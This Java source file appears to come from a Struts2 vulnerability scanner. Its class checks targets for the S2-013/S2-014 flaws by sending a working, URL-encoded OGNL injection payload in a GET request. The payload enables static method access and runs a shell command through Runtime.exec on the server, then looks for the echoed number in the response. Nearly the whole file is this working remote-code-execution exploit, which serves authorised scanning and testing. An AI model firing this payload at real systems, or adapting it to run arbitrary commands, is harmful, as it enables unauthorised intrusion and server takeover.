package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_013 implements Check {
    public String printInfo(){
        String info = "[+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception{

        int number = new Random(10000).nextInt(10000);
        String poc = "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27echo%20"+number+"%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D";
        if(path==null){
            path = "/login.action";
        }else if(!path.endsWith(".action")){
            path = path+"login.action";
        }

        String url = protocol+"://"+host+":"+port+path+"?x="+poc;


        try {
            HttpResult result= HttpClient.get(url);;
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m =p.matcher(result.getData());

            if(m.find()){
                return true;
            }else{
                return false;
            }
        }catch (Exception e){
            return false;
        }





        }



}
